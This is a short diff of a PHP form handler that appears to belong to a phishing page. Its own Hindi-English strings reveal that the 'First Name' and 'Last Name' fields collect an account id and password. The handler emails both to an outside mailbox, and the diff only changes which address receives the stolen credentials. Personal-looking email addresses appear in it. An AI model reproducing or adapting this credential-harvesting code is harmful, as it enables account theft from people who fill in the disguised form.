@@ -5,7 +5,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     // Do something with the data, such as store it in a database or send it via email
     // For example, sending an email
-    $to = "adityasemwal1221@email.com";
+    $to = "ssp105@outlook.com";
     $subject = "Aise milega tujhe password?";
     $message = "First Name matlab yaha id ka naam: $first_name\nLast Name matlab yaha id ka password use karunga: $last_name";
     $headers = "From: adibakahai@gmail.com";
